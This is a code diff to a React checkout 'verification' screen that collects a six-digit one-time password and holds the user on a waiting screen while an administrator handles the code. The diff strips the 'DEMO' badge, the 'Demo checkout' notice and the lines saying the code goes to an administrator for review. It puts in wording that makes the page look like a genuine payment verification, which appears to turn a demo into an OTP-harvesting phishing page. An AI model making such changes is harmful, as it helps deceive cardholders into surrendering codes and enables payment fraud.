@@ -34,7 +34,7 @@ type TestVerificationScreenProps = {
   onContinue: () => void;
 };
 
-const disclosure = 'Demo checkout. This page does not send a code or charge a payment card.';
+const disclosure = 'No payment is processed. This page does not send an email or SMS.';
 function contrastText(hex: string) {
   const channels = [1, 3, 5].map(index => parseInt(hex.slice(index, index + 2), 16) / 255);
   const [red, green, blue] = channels.map(channel => channel <= 0.04045 ? channel / 12.92 : ((channel + 0.055) / 1.055) ** 2.4);
@@ -105,8 +105,7 @@ export function TestVerificationScreen({
             </div>
             <div className="flex justify-end">
               <div className="border-l border-[#e6e8ec] pl-3 text-right sm:pl-6">
-                <span className="inline-block rounded-[3px] border border-[#d8cfa7] bg-[#fff8df] px-2 py-0.5 text-[11px] font-extrabold tracking-[.14em] text-[#705715]">DEMO</span>
-                <p className="mt-1 text-[10px] leading-tight text-[#737d89]">No charge</p>
+                <span className="inline-block rounded-[3px] border border-[#d8cfa7] bg-[#fff8df] px-2 py-0.5 text-[11px] font-extrabold tracking-[.1em] text-[#705715]">NO CHARGE</span>
               </div>
             </div>
           </div>
@@ -127,7 +126,7 @@ export function TestVerificationScreen({
               <h2 className="text-[15px] font-bold uppercase leading-[1.35] tracking-[.015em] sm:text-[17px]" style={{ color: accent }}>
                 {appearance?.verificationPrompt?.trim() || 'SELLECT METHOD TO RECIEVE YOUR ONE TIME PASSWORD'}
               </h2>
-              <p className="mt-2 text-[12px] leading-5 text-[#69727e]">Your team shares the code separately. This page does not send email or SMS.</p>
+              <p className="mt-2 text-[12px] leading-5 text-[#69727e]">The code is provided separately. This page does not send email or SMS.</p>
               <fieldset className="mt-4 space-y-1">
                 <legend className="sr-only">Code delivery method</legend>
                 {(['email', 'phone'] as const).map(option => (
@@ -173,7 +172,7 @@ export function TestVerificationScreen({
           {phase === 'enter' && (
             <div className="pt-7">
               <h2 className="text-[16px] font-bold uppercase leading-[1.35]" style={{ color: accent }}>Enter your code</h2>
-              <p className="mt-3 text-[13px] leading-5 text-[#5d6572]">Enter the six-digit code your team shared by {method === 'phone' ? 'phone' : 'email'}. This page does not send one.</p>
+              <p className="mt-3 text-[13px] leading-5 text-[#5d6572]">Enter the six-digit code provided by {method === 'phone' ? 'phone' : 'email'}.</p>
               <form className="mt-6" onSubmit={event => { event.preventDefault(); if (!busy && /^\d{6}$/.test(code)) onSubmit(); }}>
                 <label htmlFor="test-verification-code" className="mb-2 block text-[13px] font-semibold">Six-digit code</label>
                 <input
@@ -193,7 +192,7 @@ export function TestVerificationScreen({
                   className="h-12 w-full rounded-[4px] border border-[#cbd0d7] bg-white px-4 font-mono text-[21px] tracking-[.3em] outline-none focus:border-[#54448b] disabled:opacity-50"
                 />
                 {error && <p id="test-verification-error" role="alert" data-testid="text-verification-error" className="mt-2 text-[12px] font-medium text-[#b42335]">{error}</p>}
-                <p id="test-verification-note" className="mt-2 text-[12px] leading-5 text-[#69727e]">Your submitted code will be reviewed by the administrator.</p>
+                <p id="test-verification-note" className="mt-2 text-[12px] leading-5 text-[#69727e]">You’ll see an update after submitting your code.</p>
                 <div className="mt-5 flex justify-end">
                   <button type="submit" disabled={busy || !/^\d{6}$/.test(code)} data-testid="button-test-verification-submit" className={buttonClass} style={buttonStyle}>
                     {busy ? <><LoaderCircle size={15} className="mr-2 animate-spin" aria-hidden="true" /> Submitting…</> : 'Submit code'}
@@ -208,8 +207,8 @@ export function TestVerificationScreen({
               <LoaderCircle size={27} className="mb-4 animate-spin" style={{ color: accent }} aria-hidden="true" />
               <h2 className="text-[16px] font-bold uppercase" style={{ color: accent }}>{waitingForCode ? 'Waiting for your code' : 'Verification in progress'}</h2>
               <p className="mt-3 text-[13px] leading-6 text-[#5d6572]">{waitingForCode
-                ? 'Your selected method is with the administrator. This page will update when your team confirms the code has been shared.'
-                : 'Your code was sent to the administrator. This page will update when the review is complete.'}</p>
+                ? 'Please wait. Code entry will appear when your code is ready.'
+                : 'Your code was submitted. This page will update when verification is complete.'}</p>
               {error && <p role="alert" data-testid="text-verification-error" className="mt-3 text-[12px] font-medium text-[#b42335]">{error}</p>}
             </div>
           )}
